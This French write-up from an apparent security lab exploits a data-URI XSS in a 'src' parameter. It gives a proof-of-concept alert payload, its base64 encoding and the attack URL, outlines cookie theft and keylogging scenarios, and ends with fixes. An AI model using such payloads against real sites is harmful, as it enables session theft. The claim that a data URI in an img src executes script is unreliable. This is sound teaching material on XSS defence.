# Data URI Injection - XSS via paramètre src

## 1. Découverte de la faille

La page utilise un paramètre `src` pour afficher des médias :
```
http://localhost:8080/?page=media&src=photo
```

Le site affiche le contenu de `src` sans validation → vulnérabilité d'injection.

## 2. Risques - XSS (Cross-Site Scripting)

Le **XSS** permet à un attaquant d'injecter du code JavaScript malveillant qui s'exécute dans le navigateur d'autres utilisateurs, dans le contexte du site de confiance.

**Comment ça fonctionne :**
1. L'attaquant injecte du code dans un paramètre URL (comme `src=`)
2. Le site affiche ce code sans le "nettoyer"
3. Le navigateur de la victime exécute le code, pensant qu'il vient du site légitime
4. Le code malveillant a accès aux cookies, sessions, et peut manipuler la page

### Cas concrets d'exploitation

#### 1. Vol de Session (Session Hijacking)
C'est le cas le plus classique et le plus critique.
*   **Scénario :** Un attaquant envoie un lien piégé à un administrateur du site.
    *   Lien : `http://vulnerable-site.com/?page=media&src=data:text/html;base64,...`
*   **Action :** Le script injecté s'exécute invisiblement et récupère le cookie de session (`document.cookie`).
*   **Conséquence :** Il envoie ce cookie à un serveur contrôlé par l'attaquant, permettant une connexion sans mot de passe.

#### 2. Phishing sophistiqué ("Sur Site")
Contrairement à un site de phishing classique, l'attaque se déroule sur le **vrai domaine**.
*   **Scénario :** L'attaquant injecte un formulaire HTML imitant la mire de connexion.
*   **Action :** L'utilisateur voit l'URL légitime dans sa barre d'adresse et entre ses identifiants en confiance.
*   **Conséquence :** Le formulaire envoie le mot de passe directement à l'attaquant.

#### 3. Keylogger (Enregistreur de frappe)
*   **Scénario :** Un script injecté écoute tous les événements de frappe clavier (`keydown`).
*   **Conséquence :** Tout ce que la victime tape (messages, numéros de carte, mots de passe) est envoyé en temps réel à l'attaquant.

#### 4. Actions non désirées (CSRF via XSS)
*   **Scénario :** Le script injecté effectue des requêtes API au nom de la victime connectée (ex: changement de mot de passe, suppression de compte).
*   **Conséquence :** Le serveur accepte ces actions car elles proviennent du navigateur légitime de la victime.

#### 5. Accès Intranet / Contournement
*   **Scénario :** Le code s'exécute depuis le navigateur de la victime, potentiellement situé dans un réseau d'entreprise protégé.
*   **Conséquence :** L'attaquant peut scanner le réseau interne ou accéder à des ressources inaccessibles depuis l'extérieur.

## 3. Exploitation

Un **Data URI** permet d'encoder le contenu d'un fichier directement dans l'URL au lieu de pointer vers un fichier externe.

**Syntaxe :**
```
data:[type MIME];[encodage],[données]
```

**Sans base64 (caractères spéciaux posent problème) :**
```
data:text/html,<script>alert('XSS')</script>
```

Caractères spéciaux qui peuvent être mal interprétés:
Les `<`, `>`, `'`, espaces peuvent être interprétés comme des délimiteurs d'URL.

**Avec base64 (sûr et universel) :**
```
data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4K
```
Le base64 transforme n'importe quel contenu en caractères "sûrs" (A-Z, a-z, 0-9, +, /, =).

### Exploitation de la faille
**1. Créer le payload malveillant**

```bash
# Code à injecter
<script>alert('XSS')</script>

# Encoder en base64 pour éviter les problèmes de caractères spéciaux
echo '<script>alert("XSS")</script>' | base64
# Résultat : PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4K
```

**2. Construire l'URL d'attaque**

```
http://localhost:8080/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4K
```

Le site fait simplement :
```php
$src = $_GET['src'];  // Récupère n'importe quoi
echo '<img src="' . $src . '">';  // L'affiche sans vérifier
```

Ce qui produit dans le HTML :
```html
<img src="data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4K">
```

Le navigateur voit cet attribut `src` avec un Data URI et l'exécute comme du HTML !

## 3. Solution

### Validation stricte

```php
// ❌ Vulnérable
$src = $_GET['src'];
echo '<img src="' . $src . '">';

// ✅ Sécurisé
$src = $_GET['src'];
$allowed = ['jpg', 'jpeg', 'png', 'gif', 'webp'];
$ext = strtolower(pathinfo($src, PATHINFO_EXTENSION));

// Bloquer les Data URIs et valider l'extension
if (!preg_match('/^data:/i', $src) && in_array($ext, $allowed)) {
    echo '<img src="' . htmlspecialchars($src, ENT_QUOTES, 'UTF-8') . '">';
} else {
    die('Format non autorisé');
}
```

### Content Security Policy (CSP)

Bloquer l'exécution de scripts inline :

```php
header("Content-Security-Policy: default-src 'self'; script-src 'self'");
```

### Bonnes pratiques

1. **Whitelist** : Autoriser uniquement les extensions/sources connues
2. **Bloquer Data URIs** : Rejeter tout `data:` avec regex
3. **Échappement** : `htmlspecialchars()` sur toutes les sorties
4. **CSP** : Implémenter une politique de sécurité stricte
5. **Validation serveur** : Ne jamais faire confiance aux entrées utilisateur
